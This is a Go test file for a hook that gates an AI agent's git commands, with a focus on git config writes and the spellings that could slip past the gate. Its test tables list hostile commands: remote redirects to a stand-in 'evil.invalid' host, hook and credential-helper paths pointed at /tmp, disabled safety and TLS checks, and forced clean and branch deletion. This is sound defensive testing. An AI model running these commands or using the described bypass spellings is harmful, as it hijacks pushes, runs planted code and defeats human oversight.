// pg2-bohpm turned the push cases into Rejects WITHOUT touching `git branch -D`,
// whose re-classification is a separate, still-unreviewed question. Both naive
// edits are wrong, and this test catches each: flipping the shared site to Reject
// would make this Reject, and dropping the `branch` case from isDestructive would
// make it fall through to modifyingSubcommands["branch"] and become APPROVE.
func TestGit_BranchForceDelete_StaysAsk(t *testing.T) {
	r := New(nil)
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git branch -D feat"}),
	}
	got := r.Evaluate(input)
	if got.Decision == hookio.Approve {
		t.Fatalf("git branch -D feat: got APPROVE (%s) — it fell through to modifyingSubcommands[\"branch\"]; the documented trap", got.Reason)
	}
	if got.Decision != hookio.Ask {
		t.Errorf("git branch -D feat: got %s (%s), want ask (unchanged by pg2-bohpm)", got.Decision, got.Reason)
	}
}

// TestGit_ConfigSafetyKeyWrite_Ask pins the pg2-szadj gate for the SINK and
// INTERLOCK classes. Before this bead `config` was a plain member of
// modifyingSubcommands with no key inspection at any position, so every row here
// measured `allow` on a binary built from main @ 259f3331 (2026-07-30).
//
// THE FLAG ROWS ARE THE DEFECT AND MUST NOT BE DROPPED. `--global`, `--local`,
// `--system` and `--type=bool` each shift the key out of first position, and the
// git 2.54 `git config set <key> <value>` form shifts it again; a separated
// `-f <file>` shifts it a third time. Deleting any of those rows would let a
// future edit reintroduce a fixed-index key lookup with everything else green.
func TestGit_ConfigSafetyKeyWrite_Ask(t *testing.T) {
	ask := []string{
		// The four measured holes.
		"git config clean.requireForce false",
		"git config --global clean.requireForce false",
		"git config --type=bool clean.requireForce false",
		"git config core.hooksPath /tmp/h",
		// FLAG-POSITION INDEPENDENCE: every scope and type spelling.
		"git config --local clean.requireForce false",
		"git config --system clean.requireForce false",
		"git config --worktree clean.requireForce false",
		"git config --global --type=bool clean.requireForce false",
		"git config --type bool clean.requireForce false",
		"git config --replace-all core.hooksPath /tmp/h",
		"git config --add core.hooksPath /tmp/h",
		"git config -f .git/config core.hooksPath /tmp/h",
		// --unset names ONE operand, exactly like a bare read, so it is recognised
		// by configWriteIndicated rather than by the operand bound.
		"git config --unset clean.requireForce",
		"git config --unset-all clean.requireForce",
		"git config --global --unset core.hooksPath",
		// git 2.54 SUBCOMMAND form: the key is the SECOND operand.
		"git config set core.hooksPath /tmp/h",
		"git config set --global clean.requireForce false",
		"git config unset clean.requireForce",
		// Section and variable names are case-INsensitive in git (measured 2.54.0).
		"git config CORE.HooksPath /tmp/h",
		"git config Clean.RequireForce false",
		// The remaining surveyed keys, one row each.
		"git config core.pager /tmp/p",
		"git config core.fsmonitor /tmp/m",
		"git config core.sshCommand /tmp/s",
		"git config diff.external /tmp/d",
		"git config diff.mine.textconv /tmp/t",
		"git config receive.denyCurrentBranch false",
		"git config http.sslVerify false",
		"git config http.https://host/.sslVerify false",
		// Anti-bypass siblings: the same mechanism one word away.
		"git config pager.log /tmp/p",
		"git config core.editor /tmp/e",
		"git config sequence.editor /tmp/e",
		"git config diff.mine.command /tmp/c",
		"git config merge.mine.driver /tmp/m",
		"git config filter.mine.clean /tmp/c",
		"git config filter.mine.smudge /tmp/s",
		"git config filter.mine.process /tmp/p",
		"git config credential.helper /tmp/ch",
		"git config init.templateDir /tmp/tpl",
		"git config include.path /tmp/evil.cfg",
		"git config includeIf.gitdir:/x/.path /tmp/evil.cfg",
		// A pre-subcommand -C does not displace the key either.
		"git -C /tmp/repo config core.hooksPath /tmp/h",
	}
	r := New(nil)
	for _, cmd := range ask {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Approve {
			t.Fatalf("cmd %q: got APPROVE (%s) — the config key was not seen at this operand position; the pg2-szadj defect", cmd, got.Reason)
		}
		if got.Decision != hookio.Ask {
			t.Errorf("cmd %q: got %s (%s), want ask (safety-interlock / execution-sink config write)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_ConfigRedirectKeyWrite_Reject pins the REDIRECT class at the same hard
// Reject remoteVerdict gives `git remote set-url`. `git config remote.origin.url
// <url>` IS that mutation by another porcelain, and `url.<base>.insteadOf` is
// strictly worse because the remote's own URL keeps looking correct. An Ask on any
// of these would make the config spelling the cheaper way around the gate
// pg2-8imjo closed, which is the inversion pg2-abb65's reasoning forbids.
func TestGit_ConfigRedirectKeyWrite_Reject(t *testing.T) {
	reject := []string{
		"git config url.https://evil.invalid/.insteadOf https://github.com/",
		"git config url.https://evil.invalid/.pushInsteadOf https://github.com/",
		"git config --global url.https://evil.invalid/.insteadOf https://github.com/",
		"git config remote.origin.url https://evil.invalid/x.git",
		"git config remote.origin.pushurl https://evil.invalid/x.git",
		"git config set remote.origin.url https://evil.invalid/x.git",
		"git config --unset remote.origin.url",
	}
	r := New(nil)
	for _, cmd := range reject {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s (%s), want reject (config-spelled remote redirect must match the git remote set-url Reject)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_ConfigRead_Approve is the pg2-szadj READ/WRITE discrimination guard.
// Reading configuration is how an agent inspects its own repo and MUST stay
// approvable — including a read of a GATED key, since reading one changes nothing.
//
// It also pins the REASON STRING. Before this bead a read reached the modifying arm
// and was approved as "modifying git command"; `git config --get user.email`
// modifies nothing, so that reason was wrong and is now "read-only git config".
func TestGit_ConfigRead_Approve(t *testing.T) {
	approve := []string{
		"git config --get user.email",
		"git config --list",
		"git config -l",
		"git config --get-all user.email",
		"git config --get-regexp ^user",
		"git config --global --list",
		"git config --show-origin --list",
		// A key with NO value is a read — including a gated key.
		"git config core.hooksPath",
		"git config clean.requireForce",
		"git config --get core.hooksPath",
		"git config --global core.hooksPath",
		// git 2.54 subcommand form.
		"git config get core.hooksPath",
		"git config list",
		"git config get --global clean.requireForce",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve (a config READ must stay approvable)", cmd, got.Decision, got.Reason)
		}
		if got.Reason != "read-only git config" {
			t.Errorf("cmd %q: reason is %q, want %q — before pg2-szadj a read reached the modifying arm and was reported as %q, which is wrong for a command that modifies nothing",
				cmd, got.Reason, "read-only git config", "modifying git command")
		}
	}
}

// TestGit_ConfigOrdinaryWrite_Approve is the pg2-szadj FALSE-POSITIVE guard, and
// the test that makes a blanket gate on `git config` writes fail. Routine config
// writes carry no mechanism — they execute nothing, disable no refusal and redirect
// nothing — and gating them would be a large false-positive surface over ordinary
// traffic. A fix that Asked on every write would pass both gate tests above and
// break every row here.
func TestGit_ConfigOrdinaryWrite_Approve(t *testing.T) {
	approve := []string{
		"git config user.email a@b.c",
		"git config user.name Someone",
		"git config --global user.email a@b.c",
		"git config commit.gpgsign true",
		"git config branch.main.remote origin",
		"git config branch.main.merge refs/heads/main",
		"git config push.default simple",
		"git config pull.rebase true",
		"git config core.autocrlf false",
		"git config init.defaultBranch main",
		"git config alias.st status",
		"git config --unset user.email",
		"git config set user.email a@b.c",
		// The row TestGit_Modifying_Approve pins; kept here too so this test alone
		// documents why it must not become an Ask.
		"git config x y",
	}
	r := New(nil)
	for _, cmd := range approve {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Approve {
			t.Errorf("cmd %q: got %s (%s), want approve — a blanket gate on config WRITES is the wrong fix (pg2-szadj)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_ConfigWrite_TextIsNotAnOperation is the pg2-szadj half of the pg2-5b901
// text-vs-parsed guard. pg2-5b901 is the live precedent: primarycommit hard-denied
// a `bd update` whose ARGUMENT TEXT documented a commit. A `git config
// clean.requireForce false` spelling quoted in a bd body or a commit message is
// TEXT, and gating it would make this bead's own bookkeeping unrunnable.
func TestGit_ConfigWrite_TextIsNotAnOperation(t *testing.T) {
	r := New(nil)
	cases := []struct {
		cmd  string
		want hookio.Decision
	}{
		{`git commit -m "gate git config clean.requireForce false (pg2-szadj)"`, hookio.Approve},
		{`git commit -m "git config core.hooksPath measured allow before the fix"`, hookio.Approve},
		{`git commit -m "git config remote.origin.url is now a Reject"`, hookio.Approve},
	}
	for _, tc := range cases {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": tc.cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Reject || got.Decision == hookio.Ask {
			t.Errorf("cmd %q: got %s (%s) — a config write appearing as TEXT must not be gated", tc.cmd, got.Decision, got.Reason)
		}
		if got.Decision != tc.want {
			t.Errorf("cmd %q: got %s (%s), want %s", tc.cmd, got.Decision, got.Reason, tc.want)
		}
	}
}

// TestGit_ConfigInjectionRoute_StillAbstains is the pg2-szadj REGRESSION GUARD on
// the OTHER route to the same sinks. hasGitConfigInjection owns the pre-subcommand
// `-c k=v` / `--config-env` form, and pg2-szadj gates only the PORCELAIN form; the
// two are separate controls and adding one must not weaken the other. (pg2-arfw6
// rewrites hasGitConfigInjection and has not landed — nothing here anticipates it.)
func TestGit_ConfigInjectionRoute_StillAbstains(t *testing.T) {
	r := New(nil)
	abstain := []string{
		"git -c clean.requireForce=false clean",
		"git -c core.hooksPath=/tmp/h status",
		"git --config-env=core.pager=X log",
	}
	for _, cmd := range abstain {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Abstain {
			t.Errorf("cmd %q: got %s (%s), want abstain (the -c injection guard must not be regressed by pg2-szadj)", cmd, got.Decision, got.Reason)
		}
	}
}

// TestGit_ConfigRedirectedContext pins how a redirected GIT_DIR/GIT_WORK_TREE
// composes with the read/write discrimination, because one of these verdicts MOVED
// with pg2-szadj and the move should be visible rather than incidental.
//
// A config READ under a redirect now Approves; it used to reach the modifying arm
// and its Ask. That aligns it with the policy every other read already has —
// `GIT_DIR=/other git log` is an Approve (TestGit_GitDirReadOnly_Approve) — instead
// of leaving config as the one read that Asked. A config WRITE keeps the Ask, and a
// gated key outranks it.
func TestGit_ConfigRedirectedContext(t *testing.T) {
	r := New(nil)
	cases := []struct {
		cmd  string
		want hookio.Decision
		why  string
	}{
		{"GIT_DIR=/other git config --get user.email", hookio.Approve, "a READ under a redirect matches the read-only policy"},
		{"GIT_DIR=/other git config user.email a@b.c", hookio.Ask, "a WRITE under a redirect keeps the redirect Ask"},
		{"GIT_WORK_TREE=/other git config user.email a@b.c", hookio.Ask, "same for GIT_WORK_TREE"},
		{"GIT_DIR=/other git config core.hooksPath /tmp/h", hookio.Ask, "a gated key is gated regardless of the redirect"},
		{"GIT_DIR=/other git config remote.origin.url https://evil.invalid/x.git", hookio.Reject, "a redirect must not soften the redirect-class Reject"},
	}
	for _, tc := range cases {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": tc.cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != tc.want {
			t.Errorf("cmd %q: got %s (%s), want %s — %s", tc.cmd, got.Decision, got.Reason, tc.want, tc.why)
		}
	}
}

// TestGit_ConfigSeparatedFlagValue pins configElideFlagValues from BOTH sides, and
// the two halves are in tension by design — a change that fixes one by loosening the
// other is what this catches.
//
// PRECISION half: a separated value-taking flag must not turn a READ into a gated
// write. `git config -f /repo/.git/config --get core.fsmonitor` is the shape
// internal/engine's gitdir census already pins at Approve; without the elision it
// presents two operands and reads as a write.
//
// SOUNDNESS half: eliding must not let a WRITE present as a read. The
// `--comment --get` row is the measured proof this matters — on git 2.54.0,
// 2026-07-30, `git config --comment --get core.hooksPath /tmp/h` DOES perform the
// write, because git's parse-options hands `--comment` the next argv even though it
// looks like an option. So honouring a `--get` token as a read indicator would be a
// live bypass; eliding it is git's own parse, and the two remaining operands still
// reach the gate.
func TestGit_ConfigSeparatedFlagValue(t *testing.T) {
	r := New(nil)
	cases := []struct {
		cmd  string
		want hookio.Decision
		why  string
	}{
		// PRECISION: a read stays a read.
		{"git config -f /repo/.git/config --get core.fsmonitor", hookio.Approve, "separated -f value must not make a read look like a write"},
		{"git config --file /repo/.git/config --get core.hooksPath", hookio.Approve, "same, long spelling"},
		{"git config --type bool --get clean.requireForce", hookio.Approve, "same, separated --type value"},
		// SOUNDNESS: a write stays a write.
		{"git config --comment --get core.hooksPath /tmp/h", hookio.Ask, "git gives --comment the next argv, so the --get is its VALUE and this really writes"},
		{"git config -f .git/config core.hooksPath /tmp/h", hookio.Ask, "eliding -f's value must still leave key and value as operands"},
		{"git config --type bool clean.requireForce false", hookio.Ask, "separated --type value must not hide the key"},
		{"git config --default X core.hooksPath /tmp/h", hookio.Ask, "same for --default"},
		// A glued value is part of its own token: nothing to elide.
		{"git config --type=bool clean.requireForce false", hookio.Ask, "glued --type=bool"},
	}
	for _, tc := range cases {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": tc.cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != tc.want {
			t.Errorf("cmd %q: got %s (%s), want %s — %s", tc.cmd, got.Decision, got.Reason, tc.want, tc.why)
		}
	}
}

// TestGit_Clean_StaysDecisiveAsk pins `git clean` at its present UNCONDITIONAL Ask.
// pg2-szadj gates the `clean.requireForce` WRITE and deliberately leaves this arm
// alone: a flag-aware re-classification was reviewed and rejected because the
// clustered form `-fdx` is a SINGLE token, so an exact-token `-f` test would sort
// the MOST destructive spelling into the "no force given" branch and approve it.
// The `-fdx` and `-f -d -x` rows are that trap; if a later edit splits this Ask by
// flag, they are what catches it.
func TestGit_Clean_StaysDecisiveAsk(t *testing.T) {
	r := New(nil)
	ask := []string{
		"git clean",
		"git clean -n",
		"git clean -f",
		"git clean -fd",
		"git clean -fdx",
		"git clean -f -d -x",
		"git clean --force",
		"git clean -xdf",
	}
	for _, cmd := range ask {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision == hookio.Approve {
			t.Fatalf("cmd %q: got APPROVE (%s) — a flag-aware split of the clean arm misclassified a clustered force", cmd, got.Reason)
		}
		if got.Decision != hookio.Ask {
			t.Errorf("cmd %q: got %s (%s), want ask (unchanged by pg2-szadj)", cmd, got.Decision, got.Reason)
		}
	}
}
